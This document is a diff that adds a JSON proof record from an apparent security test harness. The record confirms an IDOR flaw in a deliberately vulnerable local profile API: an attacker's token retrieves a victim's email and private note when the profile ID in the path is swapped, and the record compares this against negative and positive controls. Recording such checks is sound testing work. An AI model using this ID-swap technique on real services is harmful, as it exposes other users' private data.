@@ -1,0 +1,84 @@
+{
+  "schema_version": 1,
+  "proof_type": "idor_same_state_control",
+  "generated_at": "2026-07-19T12:08:20.396217+00:00",
+  "fixture": {
+    "name": "vulnerable-profile-api",
+    "transport": "ephemeral localhost HTTP",
+    "seed_sha256": "b4e3eee0750979f6c717dc716a303197c0f6855579e9c1172a223857a415ded8"
+  },
+  "shared_state": {
+    "authenticated_actor": "attacker",
+    "victim": "victim",
+    "seed_is_identical_for_both_requests": true
+  },
+  "negative_control": {
+    "request": {
+      "method": "GET",
+      "path": "/api/profiles/victim",
+      "authenticated_as": null,
+      "authorization": null
+    },
+    "response": {
+      "status": 401,
+      "body": {
+        "error": "unauthorized"
+      },
+      "body_sha256": "782eeaa7f1915f6783146f8180751785584f0f24bd4e503165c7fc4a597da600"
+    }
+  },
+  "control": {
+    "request": {
+      "method": "GET",
+      "path": "/api/profiles/attacker",
+      "authenticated_as": "attacker",
+      "authorization": "Bearer [REDACTED]"
+    },
+    "response": {
+      "status": 200,
+      "body": {
+        "display_name": "Mallory",
+        "email": "mallory@example.test",
+        "id": "attacker",
+        "private_note": "attacker-own-note"
+      },
+      "body_sha256": "0d655b872d6dd0a9d507b029ae7f49a19a98e1dc0657786f09484e0bb3b316d0"
+    }
+  },
+  "exploit": {
+    "request": {
+      "method": "GET",
+      "path": "/api/profiles/victim",
+      "authenticated_as": "attacker",
+      "authorization": "Bearer [REDACTED]"
+    },
+    "response": {
+      "status": 200,
+      "body": {
+        "display_name": "Vera",
+        "email": "vera@example.test",
+        "id": "victim",
+        "private_note": "VICTIM-SECRET-7F3A"
+      },
+      "body_sha256": "e44b7027f494981fbaa76c75b56f8a0f637857b72eb032f34d6f0af14997d4d2"
+    }
+  },
+  "incremental_harm": {
+    "victim": "victim",
+    "unauthorized_fields_exposed": [
+      "display_name",
+      "email",
+      "private_note"
+    ],
+    "victim_secret_sha256": "63bba1b1ef3b397719ab675fb1a053962af9b556c5449d97e89c8ae94fe410b0"
+  },
+  "assertions": {
+    "unauthenticated_request_rejected": true,
+    "control_succeeds": true,
+    "control_returns_attacker_record": true,
+    "exploit_succeeds": true,
+    "exploit_returns_victim_record": true,
+    "victim_private_data_exposed": true
+  },
+  "verdict": "confirmed"
+}
